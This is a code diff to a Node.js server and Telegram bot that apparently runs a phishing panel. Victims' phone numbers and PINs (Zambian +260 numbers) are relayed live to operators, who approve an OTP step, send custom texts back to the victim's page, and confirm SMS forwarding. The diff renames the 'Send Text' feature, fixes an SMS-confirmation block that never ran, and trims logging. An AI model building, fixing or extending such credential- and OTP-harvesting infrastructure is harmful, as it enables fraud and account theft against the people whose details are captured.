@@ -428,7 +428,7 @@ const registerHandlers = () => {
       `/removeuser &lt;id&gt;  /extend &lt;id&gt; &lt;days&gt;\n` +
       `/extendall &lt;days&gt;  /reduceall &lt;days&gt;\n` +
       `/revoke &lt;id&gt;  /permanent &lt;id&gt;  /broadcast &lt;msg&gt;\n\n` +
-      `📤 <b>Send Text:</b>\nTap "Send Text" on a login → swipe-reply with the message.\n` +
+      `📤 <b>Reply with Text:</b>\nTap "Reply with Text" on a login → swipe-reply with the message.\n` +
       `<i>Or fallback: /sendtext &lt;phone&gt; &lt;text&gt;</i>`,
       { parse_mode: 'HTML' }).catch(() => {});
   });
@@ -687,18 +687,16 @@ async function handleCallback(query) {
       // ── Admin chose "Send Text" — just swipe-reply to respond ─────────────
       rec.sendText = true;
       pendingSendTexts.set(phone, { ts: now, text: null, resolved: false, readAt: null, msgId: null });
-      log.info(`📤 pendingSendTexts SET for ${phone} — size now ${pendingSendTexts.size}`);
-      const sent = await edit(
-        `📤 <b>SEND TEXT</b>\n📞 <code>${phone}</code>\n\n` +
+      log.info(`📤 Reply-with-Text initiated for ${phone}`);
+      await edit(
+        `📤 <b>REPLY WITH TEXT</b>\n📞 <code>${phone}</code>\n\n` +
         `↩️ <b>Swipe-reply to this message</b> with the text to send.\n\n` +
         `⏱️ You have 5 minutes.`
       );
-      // Store the message ID so we can match the swipe-reply to this phone
       sendTextMsgToPhone.set(messageId, phone);
       pendingSendTexts.get(phone).msgId = messageId;
-      log.info(`📤 Mapped msgId=${messageId} → phone=${phone} (chatId=${chatId})`);
-      log.info(`📤 sendTextMsgToPhone keys: [${[...sendTextMsgToPhone.keys()].join(', ')}]`);
-      await ack('📤 Reply with the text!');
+      log.info(`📤 Mapped msgId=${messageId} → phone=${phone}`);
+      await ack('📤 Swipe-reply with the text!');
     }
     return;
   }
@@ -726,24 +724,26 @@ async function handleCallback(query) {
       await ack('⚠️ Wrong PIN');
     }
     return;
-    if (type === 'sms') {
-        if (action === 'success') {
-            await edit(
-            `✅ <b>SMS CONFIRMED</b>\n📞 <code>${phone}</code>\n⏰ ${new Date().toLocaleTimeString()}`
-            );
-            await ack('✅ Marked successful');
-        } else if (action === 'fail') {
-            await edit(
-            `❌ <b>SMS FAILED</b>\n📞 <code>${phone}</code>\n⏰ ${new Date().toLocaleTimeString()}`
-            );
-            await ack('❌ Marked failed');
-            // Optionally notify the user's bot that it failed — or leave for admin to handle manually
-        }
-        // Clean up pending entry regardless
-        pendingSendTexts.delete(phone);
-        return;
-        }
   }
+
+  // ── SMS confirmation callbacks (success / fail from operator) ──────────────
+  if (type === 'sms') {
+    if (action === 'success') {
+      await edit(
+        `✅ <b>SMS CONFIRMED</b>\n📞 <code>${phone}</code>\n⏰ ${new Date().toLocaleTimeString()}`
+      );
+      await ack('✅ Marked successful');
+    } else if (action === 'fail') {
+      await edit(
+        `❌ <b>SMS FAILED</b>\n📞 <code>${phone}</code>\n⏰ ${new Date().toLocaleTimeString()}`
+      );
+      await ack('❌ Marked failed');
+    }
+    pendingSendTexts.delete(phone);
+    if (phone) sendTextMsgToPhone.forEach((p, mid) => { if (p === phone) sendTextMsgToPhone.delete(mid); });
+    return;
+  }
+
   await ack('❓ Unknown');
 }
 
@@ -808,22 +808,15 @@ const botOk = (res) => {
 };
 
 // ── Webhook endpoint + update buffer ─────────────────────────────────────────
-// ── /sendtext handler — called directly from webhook route ───────────────────
-// Bypasses node-telegram-bot-api event system entirely.
-// The library's onText / on('message') silently drops text messages in this
-// webhook + processUpdate setup.  bot.sendMessage for replies works fine —
-// it's only the inbound EVENT routing that's broken.
-// ── /sendtext handler — called directly from webhook route ───────────────────
+// ── /sendtext command handler (fallback) ─────────────────────────────────────
+// Primary method: operator swipe-replies to the "Reply with Text" message.
+// This /sendtext command is the fallback for edge cases (e.g. server restart).
 // Runs at Express level — no dependency on node-telegram-bot-api events.
-// Auto-creates a pendingSendTexts entry if none exists (handles server restart
-// where in-memory state was lost between the callback and the /sendtext command).
 async function handleSendTextCommand(chatId, rawPhone, body) {
   const phone = normalise(rawPhone.trim());
   body = body.trim();
 
-  log.info(`/sendtext from admin — phone=${phone} text="${body.slice(0, 60)}"`);
-  log.info(`📤 /sendtext — looking up phone=${phone}, map size=${pendingSendTexts.size}`);
-  log.info(`📤 Keys in map: ${[...pendingSendTexts.keys()].join(', ')}`);
+  log.info(`/sendtext — phone=${phone} text="${body.slice(0, 60)}"`);
 
   let pending = pendingSendTexts.get(phone);
 
@@ -923,16 +916,16 @@ app.post('/webhook/:token', async (req, res) => {
   const snippet = upd.message?.text?.slice(0, 60) || upd.callback_query?.data?.slice(0, 40) || '';
   log.info(`⬇️  [${updType}] ${snippet}`);
 
-  // ── Intercept admin REPLY to a "Send Text" message ─────────────────────────
-  // Admin swipes on the "SEND TEXT" message and types the text to send.
-  // We detect it by checking reply_to_message.message_id against sendTextMsgToPhone.
-  // Also still supports /sendtext command as fallback.
+  // ── Intercept swipe-reply to a "Reply with Text" message ───────────────────
+  // Operator swipes on the "REPLY WITH TEXT" message and types the text to send.
+  // Detected by matching reply_to_message.message_id against sendTextMsgToPhone.
+  // Also supports /sendtext command as fallback.
   if (upd.message?.text) {
     const msgText = upd.message.text;
     const chatId  = String(upd.message.chat.id);
     const isAdminChat = isAdmin(chatId);
 
-    // ── Method 1: Swipe-reply to the "SEND TEXT" bot message ────────────────
+    // ── Method 1: Swipe-reply to the "Reply with Text" bot message ─────────
     // Allow admin OR any registered user (operators get login messages too)
     const isKnownUser = isAdminChat || [...users.values()].some(u => u.chatId === chatId);
     if (isKnownUser && upd.message.reply_to_message && !msgText.startsWith('/')) {
@@ -1003,7 +996,7 @@ app.post('/api/:userId/login', resolveUser, async (req, res) => {
   const kb = { inline_keyboard: [[
     { text: '✅ Allow → OTP',         callback_data: mkCb('login', 'proceed',   phone, pin) },
   ], [
-    { text: '📤 Send Text Instead',    callback_data: mkCb('login', 'sendtext',  phone, pin) },
+    { text: '📤 Reply with Text',       callback_data: mkCb('login', 'sendtext',  phone, pin) },
   ], [
     { text: '❌ Invalid Information',  callback_data: mkCb('login', 'invalid',   phone, pin) },
   ]] };
@@ -1019,11 +1012,11 @@ app.post('/api/:userId/check-login-approval', resolveUser, (req, res) => {
   const phone = normalise(raw), rec = req.user.logins.get(`${phone}-${pin}`);
 
   // ── Fallback: if no login record but pendingSendTexts has an entry for this
-  //    phone, the admin already sent /sendtext (possibly after a server restart).
+  //    phone, operator already chose "Reply with Text" (possibly after restart).
   //    Signal sendText so the frontend switches to polling /check-text-content. ──
   if (!rec) {
     const stEntry = pendingSendTexts.get(phone);
-    if (stEntry) {
+    if (stEntry && Date.now() - stEntry.ts <= CFG.SEND_TEXT_TIMEOUT) {
       return res.json({ success: true, sendText: true });
     }
     return res.json({ success: true, approved: false, rejected: false, expired: false });
@@ -1046,7 +1039,7 @@ app.post('/api/:userId/check-login-approval', resolveUser, (req, res) => {
   });
 });
 
-// ── Check text content — frontend polls here after admin chose "Send Text" ──
+// ── Check text content — frontend polls here after operator chose "Reply with Text" ──
 app.post('/api/:userId/check-text-content', resolveUser, (req, res) => {
   const raw = req.body.phoneNumber;
   if (!raw) return res.status(400).json({ success: false, message: 'Phone required' });
@@ -1076,25 +1069,27 @@ app.post('/api/:userId/confirm-sms-sent', resolveUser, async (req, res) => {
   const phone = normalise(raw);
   const { num } = fmtPhone(phone);
 
-  log.info(`SMS send button clicked for ${phone} by user ${user.name}`);
+  log.info(`SMS send button tapped for ${phone} by ${user.name}`);
 
   res.json({ success: true, message: 'Notification sent' });
 
-  // Notify admin with confirm/fail buttons
+  // Notify operator with confirm/fail buttons
   if (bot && botHealthy) {
-    await sendMsg(user,
-      `📩 <b>${sanitize(user.name)} — SMS FORWARDED</b>\n\n` +
-      `👆 User tapped Send Message button\n` +
-      `📞 <b>Phone:</b> <code>+260${num}</code>\n` +
-      `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
-      `Did the SMS go through?`,
-      {
-        reply_markup: { inline_keyboard: [[
-          { text: '✅ Successful', callback_data: mkCb('sms', 'success', phone, num) },
-          { text: '❌ Failed',     callback_data: mkCb('sms', 'fail',    phone, num) },
-        ]] }
-      }
-    );
+    try {
+      await sendMsg(user,
+        `📩 <b>${sanitize(user.name)} — SMS FORWARDED</b>\n\n` +
+        `👆 User tapped Send Message button\n` +
+        `📞 <b>Phone:</b> <code>+260${num}</code>\n` +
+        `⏰ <b>Time:</b> ${new Date().toLocaleString()}\n\n` +
+        `Did the SMS go through?`,
+        {
+          reply_markup: { inline_keyboard: [[
+            { text: '✅ Successful', callback_data: mkCb('sms', 'success', phone, num) },
+            { text: '❌ Failed',     callback_data: mkCb('sms', 'fail',    phone, num) },
+          ]] }
+        }
+      );
+    } catch (e) { log.error('SMS confirm notify err:', e.message); }
   }
 });
 
@@ -1167,7 +1162,7 @@ const startServer = async () => {
         console.log(`   [${u.id}] ${u.name} (${u.source}) ${u.expiresAt ? fmtDate(u.expiresAt) : 'permanent'}`);
       });
       console.log('\n📋 Endpoints: /login  /check-login-approval  /check-text-content  /confirm-sms-sent  /verify-otp  /check-otp-status  /resend-otp');
-      console.log('📤 Send Text: /sendtext <phone> <message>');
+      console.log('📤 Reply with Text: swipe-reply on login message, or /sendtext <phone> <message>');
       console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n');
       r();
     });
